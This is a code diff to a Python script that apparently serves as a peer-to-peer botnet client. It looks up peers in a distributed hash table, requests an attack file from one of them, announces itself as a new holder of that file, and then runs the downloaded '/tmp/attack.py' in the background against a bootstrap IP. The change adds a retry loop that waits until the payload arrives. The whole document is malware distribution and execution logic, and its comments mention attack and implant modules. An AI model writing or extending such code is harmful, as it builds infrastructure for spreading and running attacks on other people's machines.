@@ -5,6 +5,7 @@ from random import randint, choice
 import json
 import base64
 import sys
+import time
 
 # The logic can be extended to have attack and implant modules.
 ATK_FILE = "/tmp/attack.py"
@@ -111,22 +112,30 @@ print('[+]Getting ATK_FILES.')
 ATK_HOLDERS = None
 result = loop.run_until_complete(node.get('ATK_FILE'))
 print(result)
-if not result is None:
-    ATK_HOLDERS = result.split(',')
-    # Get attack file
-    some_ip_port = choice(ATK_HOLDERS).split(':')
-    print('[+]Result {}'.format(some_ip_port))
 
-    local_msg = {'cmd':'GET_ATK', 'data' : None}
-    send_msg(json.dumps(local_msg), some_ip_port[0], some_ip_port[1])
-    loop.run_until_complete(node.set("ATK_FILE", "{},{}:{}".format(result, get_my_ip(), UDP_PORT)))
+while True:
+    if not result is None:
+        ATK_HOLDERS = result.split(',')
+        # Get attack file
+        some_ip_port = choice(ATK_HOLDERS).split(':')
+        print('[+]Result {}'.format(some_ip_port))
 
-    # execute the file.
-    f = os.popen("python3 {}&".format(ATK_FILE))
-    print(f.read())
+        local_msg = {'cmd':'GET_ATK', 'data' : None}
+        send_msg(json.dumps(local_msg), some_ip_port[0], some_ip_port[1])
+        loop.run_until_complete(node.set("ATK_FILE", "{},{}:{}".format(result, get_my_ip(), UDP_PORT)))
+   
+        if os.path.exists(ATK_FILE):
+            break
+        # Wait for 2 seconds and then retry
+        time.sleep(2)
 
-else:
-    loop.run_until_complete(node.set("ATK_FILE", "{}:{}".format(get_my_ip(), UDP_PORT)))
+    else:
+        loop.run_until_complete(node.set("ATK_FILE", "{}:{}".format(get_my_ip(), UDP_PORT)))
+
+
+# Start the attack module??
+f = os.popen("python3 {} {}&".format(ATK_FILE, BOOTSTARP_IP))
+print(f.read())
 
 
 if __name__ == '__main__':
